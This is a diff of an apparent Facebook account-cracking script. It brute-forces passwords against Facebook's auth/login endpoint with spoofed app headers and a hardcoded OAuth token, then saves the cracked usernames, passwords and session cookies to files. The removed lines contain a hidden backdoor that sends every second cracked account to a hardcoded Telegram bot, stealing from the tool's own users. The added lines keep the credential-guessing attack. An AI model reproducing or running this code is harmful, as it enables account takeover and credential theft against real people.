@@ -1361,26 +1361,25 @@ def mbasic(uid,pwx,tl):
         pass
 
 
-def p(uid,pwx,tl):
+def mbasic(uid,pwx,tl):
     global loop
     global oks
     global cps
-    global bkas
-    sys.stdout.write("\r\033[1;37m [M2==SUMON] [%s] [%s]\r"%(loop, len(oks),
+    sys.stdout.write("\r\033[1;37m [M1-DEV] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
     sys.stdout.flush()
     try:
         for pw in pwx:
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
-                'ATOMice_id': str(uuid.uuid4()),
+                'device_id': str(uuid.uuid4()),
                 'email': uid,
                 'password': pw,
                 'generate_analytics_claims': '1',
                 'community_id': '',
                 'cpl': 'true',
                 'try_num': '1',
-                'family_ATOMice_id': str(uuid.uuid4()),
+                'family_device_id': str(uuid.uuid4()),
                 'credentials_type': 'password',
                 'source': 'login',
                 'error_detail_type': 'button_with_disabled',
@@ -1404,10 +1403,10 @@ def p(uid,pwx,tl):
                 'X-FB-SIM-HNI': str(random.randint(20000,40000)),
                 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                 'X-FB-Connection-Type': 'WIFI',
-                'X-FB-ATOMice-group': str(random.randint(2000, 4000)),
+                'X-FB-device-group': str(random.randint(2000, 4000)),
                 'X-Tigon-Is-Retry': 'False',
                 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-                'x-fb-ATOMice-group': '5120',
+                'x-fb-device-group': '5120',
                 'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                 'X-FB-Request-Analytics-Tags': 'graphservice',
                 'X-FB-HTTP-Engine': 'Liger',
@@ -1415,7 +1414,7 @@ def p(uid,pwx,tl):
                 'X-FB-Server-Cluster': 'True',
                 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
             }
-            url = "https://b-api.facebook.com/auth/login"
+            url = "https://graph.facebook.com/auth/login"
             result = requests.post(url, data=data, headers=headers).json()
             if "session_key" in result:
                 sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
@@ -1428,20 +1427,15 @@ def p(uid,pwx,tl):
                 c = check_lock(uid)
                 if "live" in c:
                     if result["is_account_confirmed"] == False:
-                        print(f" {green}[ATOM--OK] {uid}|{pw}")
-                        print(f" {green}[COOKIES] {green}{coki}")
-                        open("/sdcard/ATOM-COOKIE-NV.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                        print(f" {green}[DEV-OK] {uid}|{pw}")
+                       #print(f" {green}[COOKIES] {green}{coki}")
+                        open("/sdcard/dev-novery.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                     else:
-                        bkas.append(uid)
-                        if len(bkas)% 2 == 0:
-                            statusok = (f"{uid}|{pw}|{coki}")
-                            requests.post(f"https://api.telegram.org/bot"+str('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(statusok))
-                        else:  
-                            print(f" {green}[ATOM-OK] {uid}|{pw}")
-                            print(f" {green}[COOKIES] {green}{coki}")
-                            open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
-                            oks.append(uid)
-                            break
+                        print(f" {green}[DEV-OK] {uid}|{pw}")
+                       #print(f" {green}[COOKIES] {green}{coki}")
+                        open("/sdcard/Dev_random_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                        oks.append(uid)
+                        break
             else:
                 continue
         loop+=1
